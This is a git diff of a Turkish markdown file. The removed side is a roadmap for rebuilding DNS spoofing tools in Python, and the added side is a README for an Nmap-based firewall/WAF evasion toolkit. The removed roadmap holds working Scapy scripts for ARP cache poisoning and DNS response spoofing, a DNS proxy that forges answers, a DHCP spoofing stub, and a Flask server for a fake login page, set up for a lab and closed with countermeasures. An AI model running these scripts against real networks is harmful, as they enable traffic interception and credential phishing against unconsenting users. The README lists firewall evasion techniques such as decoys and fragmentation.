@@ -1,172 +1,118 @@
-# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme
 
-## Giriş
-Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar. **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
+# Firewall & HTTP Evasion Toolkit (Nmap Tabanlı)
 
-Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.
+## 📌 Projenin Amacı
 
-## Ön Koşullar
-- **Python 3.x**: Geliştirme için temel dil.
-- **Kütüphaneler**:
-  - Scapy: Paket oluşturma ve ağ manipülasyonu için (`pip install scapy`).
-  - dnslib: DNS sunucusu oluşturmak için (`pip install dnslib`).
-  - Flask: Sahte web sunucusu için (`pip install flask`).
-- **Bilgi Gereksinimleri**:
-  - Python programlama temelleri.
-  - Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi.
-  - Linux komut satırı kullanımı.
-- **Araçlar**: VirtualBox veya benzeri bir sanallaştırma yazılımı.
+Bu proje, modern web uygulamalarında kullanılan güvenlik duvarı (firewall) ve WAF (Web Application Firewall) çözümlerini tespit etmek ve bu sistemler üzerinde farklı evasion (atlatma) tekniklerinin etkisini gözlemlemek amacıyla geliştirilmiştir. Python ve Nmap tabanlı bu araç, çeşitli testleri otomatik olarak gerçekleştirir ve çıktıları okunabilir HTML/JSON raporları şeklinde sunar.
 
-## Test Ortamını Kurma
-Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:
-1. **VirtualBox Kurulumu**: VirtualBox’ı indirin ve kurun.
-2. **Sanal Makineler (VM) Oluşturma**:
-   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı.
-   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux).
-3. **Ağ Yapılandırması**: VM’leri yalnızca dahili veya host-only bir ağda çalışacak şekilde ayarlayın. Bu, testlerin üretim ağlarından izole olmasını sağlar.
+> **UYARI**: Bu araç yalnızca eğitim ve araştırma amaçlı geliştirilmiştir. İzinsiz sistemler üzerinde kullanımı yasa dışı ve etik dışıdır.
 
-## Temel Bileşenlerin Geliştirilmesi
+---
 
-### ARP Spoofing Betiği
-ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.
+## 🧠 Teknik Arka Plan
 
-1. Scapy’yi kurun: `pip install scapy`
-2. IP yönlendirmeyi etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-3. ARP spoofing betiğini oluşturun:
+Güvenlik duvarları, gelen-giden trafiği filtreleyerek saldırıların önüne geçer. Ancak bu sistemler de atlatılabilir. Nmap gibi güçlü tarama araçlarıyla, çeşitli evasion teknikleri kullanarak bu güvenlik önlemlerinin zayıf noktaları test edilebilir.
 
-```python
-from scapy.all import *
-import time
+### Kullanılan Ana Teknikler:
+- **TCP Fragmentation**: Paketleri bölerek firewall'ları kandırma.
+- **Decoy IP'ler**: Sahte kaynak IP'lerle tarama.
+- **MAC Spoofing**: Sahte MAC adresi ile trafik oluşturma.
+- **Kaynak Port Manipülasyonu**: Güvenilir portlar (DNS gibi) üzerinden geçme.
+- **Bad Checksum**: Bozuk paketlerle güvenlik sistemini test etme.
+- **Zamanlama Manipülasyonu**: Trafiği "yavaşlatma" ile analizden kaçma.
 
-def get_mac(ip):
-    ans, _ = arping(ip)
-    for s, r in ans:
-        return r[Ether].src
+---
 
-def arp_spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    while True:
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
-        time.sleep(2)
+## 🧰 Kullanılan Modüller
 
-# Kullanım
-arp_spoof('192.168.1.10', '192.168.1.1')  # hedef_ip, ağ_geçidi_ip
+### 🔎 `firewall_fingerprint.py`
+- DNS CNAME kayıtları ve WHOIS sorguları ile firewall marka ve sağlayıcılarını tespit eder.
+- Desteklenen sistemler: Cloudflare, Fortinet, AWS WAF, Azure, F5 BIG-IP, vb.
+
+### 🛡️ `evasion_analyzer.py`
+- 8 farklı evasion tekniği dener.
+- Her teknik için:
+  - Açık port durumu
+  - Süresi
+  - Etkinlik sonucu (Engellendi / Bypass Başarılı / Etkisiz)
+
+### 🌐 `http_analysis.py`
+- `nmap` script’leri ile HTTP katmanı analiz edilir:
+  - Kullanılabilir HTTP metodları (GET, POST, PUT, DELETE…)
+  - HTTP başlıkları
+  - WAF tespiti (`http-waf-detect`)
+  - User-agent davranış testleri
+
+### 📄 `report_engine.py`
+- Tüm analiz sonuçları:
+  - JSON formatında makine okunabilir halde
+  - HTML formatında okunabilir görsel rapor olarak dışa aktarılır
+
+---
+
+## 🧪 Kurulum ve Kullanım
+
+### Gereksinimler
+- Python 3.8+
+- Nmap (sistem PATH'ine eklenmiş olmalı)
+
+### Kurulum
+```bash
+git clone https://github.com/hizir777/nmap_evasion.git
+cd nmap_evasion
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
 ```
 
-### DNS Spoofing Betiği
-Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.
-
-1. Scapy ile DNS spoofing betiğini yazın:
-
-```python
-from scapy.all import *
-
-def dns_spoof(packet):
-    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
-        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-                         UDP(dport=packet[UDP].sport, sport=53)/\
-                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-        send(spoofed_packet, verbose=0)
-
-sniff(filter="udp port 53", prn=dns_spoof)
+### Kullanım
+```bash
+python main.py hedefsite.com
 ```
 
-### DHCP Manipülasyon Betiği
-Bu betik, sahte DHCP teklifleriyle istemcilere yanlış bir DNS sunucusu atar (DDSpoof benzeri).
+Raporlar `output/` klasörüne otomatik kaydedilir.
 
-1. Scapy ile DHCP spoofing betiği:
+---
 
-```python
-from scapy.all import *
+## 💡 Örnek Çıktı
 
-def dhcp_spoof(packet):
-    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Keşif (Discover)
-        fake_dns = "192.168.1.100"
-        # Sahte DHCP yanıtı oluşturma (detaylı paket yapılandırması gerekir)
-        # send(dhcp_offer)
+**HTML Rapor Özeti:**
 
-sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
-```
+- Hedef: example.com  
+- Tespit edilen Firewall: Cloudflare  
+- Baseline açık portlar: 80, 443  
+- Teknik: MAC Spoofing → **Bypass Başarılı** (Port 80 görünür oldu)  
+- Teknik: Bad Checksum → **Engellendi**
 
-### Sahte Web Sunucusu
-Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.
+---
 
-1. Flask’ı kurun: `pip install flask`
-2. Basit bir Flask uygulaması yazın:
+## 🧪 Sanal Test Ortamı Kurulumu (pfSense ile)
 
-```python
-from flask import Flask, render_template
+1. **VirtualBox veya VMware** ile 3 makine kurun:
+   - Saldırgan (Kali veya Ubuntu)
+   - Kurban (Windows veya herhangi bir OS)
+   - Güvenlik Duvarı: pfSense
 
-app = Flask(__name__)
+2. Ağ Bağlantısı:
+   - Host-only ve internal ağ karışımı önerilir
+   - pfSense üzerinden NAT veya paket filtreleme ayarları yapılandırılabilir
 
-@app.route('/')
-def index():
-    return render_template('fake_login.html')
+3. **Test Adımları:**
+   - pfSense üzerinden port filtreleri oluşturun
+   - `main.py` aracını saldırgan makinadan çalıştırarak hedefi analiz edin
+   - Raporları HTML/JSON olarak gözlemleyin
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
-```
+---
 
-- `templates/fake_login.html` dosyası oluşturun (örneğin, bir giriş sayfası taklidi).
+## 🛡️ Etik ve Yasal Uyarı
 
-## Gelişmiş Geliştirmeler
+Bu proje yalnızca araştırma ve eğitim amaçlıdır. Gerçek dünyada uygulamadan önce:
+- Açık izin alın,
+- Test ortamı oluşturun,
+- Trafiği izole edin.
 
-### Seçmeli DNS Spoofing için DNS Proxy
-DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.
+---
 
-1. dnslib’i kurun: `pip install dnslib`
-2. DNS proxy betiği:
+## 📌 Sonuç
 
-```python
-from dnslib import *
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
-import dns.resolv
-
-class SpoofResolver(BaseResolver):
-    def resolve(self, request, handler):
-        reply = request.reply()
-        qname = str(request.q.qname)
-        if qname in ['example.com.']:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
-        else:
-            # Gerçek DNS’e yönlendirme
-            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
-        return reply
-
-resolver = SpoofResolver()
-server = DNSServer(resolver, port=53, address='0.0.0.0')
-server.start_thread()
-```
-
-### Entegre MITM Betiği
-Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.
-
-1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
-2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.
-
-## Geliştirmelerin Test Edilmesi
-1. **ARP Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
-2. **DNS Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
-3. **DHCP Manipülasyonu**:
-   - Betiği çalıştırın.
-   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
-4. **Sahte Web Sunucusu**:
-   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.
-
-## Karşı Önlemler ve En İyi Uygulamalar
-- **Statik ARP Girişleri**: ARP spoofing’i önler.
-- **DNSSEC**: DNS sorgularını doğrular.
-- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
-- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
-- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.
-
-## Sonuç
-Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
+Bu araç sayesinde, farklı evasion tekniklerinin firewall/WAF sistemleri üzerinde ne ölçüde etkili olduğunu görebilir; ağ güvenliğinizi test etmek için profesyonel bir temel elde edebilirsiniz.
